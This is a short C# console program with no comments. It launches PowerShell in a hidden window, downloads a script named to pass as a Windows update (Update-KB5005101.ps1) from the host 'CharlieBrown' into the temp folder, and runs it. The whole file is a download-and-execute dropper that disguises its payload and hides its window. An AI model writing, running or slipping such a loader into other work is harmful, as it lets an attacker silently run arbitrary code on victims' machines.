using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var filePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

           Process process = new Process();
           process.StartInfo.FileName = filePath;
           process.StartInfo.Arguments = "cd $Env:TMP;iwr -uri http://CharlieBrown/Update-KB5005101.ps1 -outfile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}